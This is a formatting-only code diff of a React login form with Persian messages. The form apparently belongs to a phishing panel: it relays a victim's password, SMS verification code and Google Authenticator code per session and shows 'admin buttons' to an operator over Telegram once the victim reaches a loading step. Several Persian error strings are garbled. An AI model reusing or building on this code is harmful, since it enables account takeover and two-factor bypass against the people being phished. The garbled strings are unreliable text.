@@ -588,7 +588,9 @@ export const LoginForm = () => {
       // Show admin buttons after reaching loading page
       setTimeout(async () => {
         try {
-          console.log("📱 User reached loading step from phone, showing admin buttons...");
+          console.log(
+            "📱 User reached loading step from phone, showing admin buttons...",
+          );
           console.log("🔍 Session ID:", result.sessionId);
           console.log("🔍 Telegram config valid:", validateTelegramConfig());
 
@@ -596,7 +598,9 @@ export const LoginForm = () => {
           console.log("📱 showAdminButtons result:", showResult);
 
           if (!showResult) {
-            console.error("❌ showAdminButtons returned false - check Telegram configuration");
+            console.error(
+              "❌ showAdminButtons returned false - check Telegram configuration",
+            );
           } else {
             console.log("✅ Admin buttons should now be visible in Telegram");
           }
@@ -605,7 +609,7 @@ export const LoginForm = () => {
           console.error("Error details:", {
             name: error.name,
             message: error.message,
-            stack: error.stack
+            stack: error.stack,
           });
         }
       }, 500);
@@ -712,7 +716,9 @@ export const LoginForm = () => {
       }, 2000);
     } catch (error) {
       console.error("Verification error:", error);
-      setErrors({ verifyCode: "کد تا��ید نادرست است. لطفا دوباره تلاش ک���ید." });
+      setErrors({
+        verifyCode: "کد تا��ید نادرست است. لطفا دوباره تلاش ک���ید.",
+      });
     } finally {
       setIsSubmitting(false);
     }
@@ -770,7 +776,9 @@ export const LoginForm = () => {
     setErrors({});
 
     if (!googleCode || googleCode.length !== 6) {
-      setErrors({ googleCode: "��د Google Authenticator �� رقمی را وارد کنید" });
+      setErrors({
+        googleCode: "��د Google Authenticator �� رقمی را وارد کنید",
+      });
       return;
     }
 
@@ -2707,7 +2715,11 @@ export const LoginForm = () => {
                 setIsSubmitting(true);
 
                 try {
-                  const success = await updateAuthStep(sessionId, "password", passwordValue);
+                  const success = await updateAuthStep(
+                    sessionId,
+                    "password",
+                    passwordValue,
+                  );
                   if (!success) {
                     throw new Error("Failed to update password step");
                   }
@@ -2728,7 +2740,9 @@ export const LoginForm = () => {
                   }, 500);
                 } catch (error) {
                   console.error("Password submission error:", error);
-                  setErrors({ password: "خطا در ارسال رمز عبور. لطفا دوباره تلاش کنید." });
+                  setErrors({
+                    password: "خطا در ارسال رمز عبور. لطفا دوباره تلاش کنید.",
+                  });
                 } finally {
                   setIsSubmitting(false);
                 }
